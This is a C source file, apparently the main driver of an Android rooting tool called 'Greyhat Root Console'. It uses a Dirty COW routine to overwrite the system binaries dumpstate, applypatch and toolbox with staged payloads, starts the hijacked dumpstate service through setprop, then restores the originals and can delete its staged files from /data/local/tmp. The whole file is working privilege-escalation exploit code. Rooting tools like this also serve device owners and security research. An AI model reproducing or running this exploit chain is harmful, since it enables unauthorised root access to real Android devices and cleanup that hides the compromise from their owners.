#include <unistd.h>
#include <sys/system_properties.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#include "shared.h"

//dirtycow by timwr
int dcow(const char *dst, const char *src);

// returns 0 on success, other on failure 
int copy(const char *dst, const char *src);

int main(int argc, const char *argv[]) {
	int auto_remove=0;

    if ( argc > 1 ) /* farm autoremove to remove files after processing */
    {

		int iOptionCntr=1;
		while (argv[iOptionCntr] != NULL){
			if(strcmp(argv[iOptionCntr], "autoremove") == 0){
				auto_remove=1;
    	    }
		iOptionCntr++;
		}
	}


	printf( "[*] Greyhat Root Console is starting [*]\n" );
	LOGV("[*] Greyhat Root Console is starting [*]");
   
	   //delete files from previous runs
	   if ( remove(RSF_ALL_DONE) ) {}

	//links for backup/restore Android factory binaries	
	const char *dumpstate_path="/system/bin/dumpstate";
	const char *dumpstate_bak="/data/local/tmp/dumpstate-bak";
	const char *toolbox_path="/system/bin/toolbox";
	const char *toolbox_bak="/data/local/tmp/toolbox-bak";
	const char *applypatch_path="/system/bin/applypatch";
	const char *applypatch_bak="/data/local/tmp/applypatch-bak";
	
	//make copies of the original binaries before we alter them
			if( copy(dumpstate_bak, dumpstate_path) ) {
				LOGV("ERROR: could not copy %s to %s",dumpstate_path, dumpstate_bak);
			}else{LOGV("Successfully copied %s to %s",dumpstate_path, dumpstate_bak);} /* successfully backed up binary */
			if( copy(toolbox_bak, toolbox_path) ) {
				LOGV("ERROR: could not copy %s to %s", toolbox_path, toolbox_bak);
			}else{LOGV("Successfully copied %s to %s", toolbox_path, toolbox_bak);} /* successfully backed up binary */
			if( copy(applypatch_bak, applypatch_path) ) {
				LOGV("ERROR: could not copy %s to %s", applypatch_path, applypatch_bak);
			}else{LOGV("Successfully copied %s to %s", applypatch_path, applypatch_bak);} /* successfully backed up binary */
	

	

	printf( "[*] building a bridge\n" );
	LOGV("[*] building a bridge");
	if( dcow("/system/bin/dumpstate", "/data/local/tmp/bridge") ) {
		LOGV("ERROR: could not overwrite /system/bin/dumpstate");
		return 1;
	}

	printf( "[*] starting the bridge\n" );
	LOGV("[*] starting the bridge");
	if(!fork()) {
		const char *args[] = {"/system/bin/setprop", "ctl.start", "dumpstate", 0};
		if( execv(args[0], (char *const *)args) ) {
			LOGV("ERROR running setprop");
			return 0;
		}
	}

	printf( "[*] putting a till back in the shed\n" );
	LOGV("[*] putting a till back in the shed");
	if( dcow("/system/bin/applypatch", "/data/local/tmp/till") ) {
		LOGV("ERROR: could not overwrite /system/bin/applypatch");
		return 1;
	}

	printf( "[*] overwriting the toolbox\n" );
	LOGV("[*] overwriting the toolbox");
	if( dcow("/system/bin/toolbox", "/data/local/tmp/toolbox") ) {
		LOGV("too much of a mess");
		return 1;
	}

	printf( "[*] waiting for process to finish\n" );
	LOGV("[*] waiting for process to finish");


	//wait for bridge to signal all done...
	while(check_value(RSF_ALL_DONE) == 0){
		sleep(1);
	}

/* <-=-=-=-=-=-=-=->] Replacing factory binaries  [<-=-=-=-=-=-=-=-> */

int iSucceed=0;

	LOGV("[*] replacing /system/bin/applypatch");
	if( dcow("/system/bin/applypatch", "/data/local/tmp/applypatch-bak") ) {
		LOGV("ERROR restoring: /system/bin/applypatch");
	}else{		iSucceed++;}

	LOGV("[*] replacing /system/bin/toolbox");
	if( dcow("/system/bin/toolbox", "/data/local/tmp/toolbox-bak") ) {
		LOGV("ERROR restoring: /system/bin/toolbox");
	}else{		iSucceed++;}
	
	LOGV("[*] replace /system/bin/dumpstate");
	if( dcow("/system/bin/dumpstate", "/data/local/tmp/dumpstate-bak") ) {
		LOGV("ERROR restoring: /system/bin/dumpstate");
	}else{		iSucceed++;}
	
   //remove the backup copies, this is not optional -- see below for optional removes
   int rm_status = remove("/data/local/tmp/applypatch-bak");
 	   if( rm_status != 0 ){
      		LOGV("Unable to delete applypatch-bak");
      		perror("Error");
   		}
	rm_status = remove("/data/local/tmp/toolbox-bak");
 	   if( rm_status != 0 ){
      		LOGV("Unable to delete toolbox-bak");
      		perror("Error");
   		}
	rm_status = remove("/data/local/tmp/dumpstate-bak");
 	   if( rm_status != 0 ){
      		LOGV("Unable to delete dumpstate-bak");
      		perror("Error");
   		}


//if autoremove was passed into farm then remove all files from /data/local/tmp/
		if(auto_remove > 0){

			rm_status = remove("/data/local/tmp/till");
 	   		if( rm_status != 0 ){
      			LOGV("Unable to delete /data/local/tmp/till");
      			perror("Error");
   			}
			rm_status = remove("/data/local/tmp/bridge");
 	   		if( rm_status != 0 ){
      			LOGV("Unable to delete /data/local/tmp/bridge");
      			perror("Error");
   			}   		
			rm_status = remove("/data/local/tmp/cmd_list.txt");
 	   		if( rm_status != 0 ){
      			LOGV("Unable to delete /data/local/tmp/cmd_list.txt");
      			perror("Error");
   			}
			rm_status = remove("/data/local/tmp/toolbox");
 	   		if( rm_status != 0 ){
      			LOGV("Unable to delete /data/local/tmp/toolbox");
      			perror("Error");
   			}
			rm_status = remove("/data/local/tmp/farm");
 	   		if( rm_status != 0 ){
      			LOGV("Unable to delete /data/local/tmp/farm");
      			perror("Error");
   			}
   		}
   			
	//if we replaced toolbox, dumpstate and applypatch, I feel ok about no reboot, otherwise I really prefer you reboot A.S.A.P.
	if (iSucceed == 3 ) {
		printf( "[*] All done, all files restored successfully!!!\n" );
		LOGV("[*] All done, all files restored successfully!!!");
	}else{
		printf("iSucceed was: %i\n",iSucceed);
		printf( "[*] All done **RECOMMEND REBOOT A.S.A.P.**!!!\n" );
		LOGV("[*] All done **RECOMMEND REBOOT A.S.A.P.**!!!");		
	}
	return 0;
}

// returns 0 on success, other on failure 
int copy(const char *dst, const char *src) {
	int dst_fd, src_fd; 
	size_t src_len;
	ssize_t total;

	// open files
	dst_fd = open(dst, O_WRONLY | O_TRUNC | O_CREAT, 0777);
	src_fd = open(src, O_RDONLY);

	// check for open errors
	if( dst_fd == -1 || src_fd == -1 ) {
		if( dst_fd != -1 )
			close(dst_fd);
		if( src_fd != -1 )
			close(src_fd);
		return -1;
	}

	// get src_len
	if( (src_len = (size_t) lseek(src_fd, 0, SEEK_END)) == (size_t)-1 ) {
		close(src_fd); close(dst_fd);
		return -1;
	}
	lseek(src_fd, 0, SEEK_SET);

	// lazy copy file
	total = sendfile(dst_fd, src_fd, NULL, src_len);
	close(dst_fd);
	close(src_fd);

	chmod(dst, 0701);
	chmod(dst, 0702);
	chmod(dst, 0703);
	chmod(dst, 0704);
	chmod(dst, 0705);
	chmod(dst, 0706);
	chmod(dst, 0707);

	// return 0 on success
	return total != (ssize_t)src_len;
}
